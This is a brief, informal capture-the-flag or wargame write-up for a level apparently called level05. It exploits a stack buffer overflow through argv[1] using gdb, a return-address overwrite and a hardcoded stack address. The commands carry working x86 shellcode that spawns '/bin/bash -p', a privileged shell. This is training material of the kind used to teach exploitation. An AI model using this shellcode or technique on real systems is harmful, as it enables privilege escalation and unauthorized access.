#level5

1. Put random shit in argv[1].
We notice we get a segfault

2. gdb
Let's put random shit 'til we get to overwrite the ret address.

```
br address before printf call
run $(python -c 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x    68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "BCCCC\xef\xbe\xad\xde" + "IFGHIJKLMNOPQRSTUVWXYZAAAABBBB"')
```
**Boom!** we get ret overwritten by 0xdeadbeef
Now all we have to do is make it point to our shellcode.

Let's print out the stack:
```
x/200x $esp
```
Okay, done. Now we have found a good address on the stack let's put some NOP sled and some shellcode. Oh wait did it work with 'A'?


```
/levels/level05 $(python -c 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "BCCCC\x50\xfd\xff\xbf" + "IFGHIJKLMNOPQRSTUVWXYZAAAABBBB"')
```

I guess it was a valid opcode or smth. Too lazy to try back.
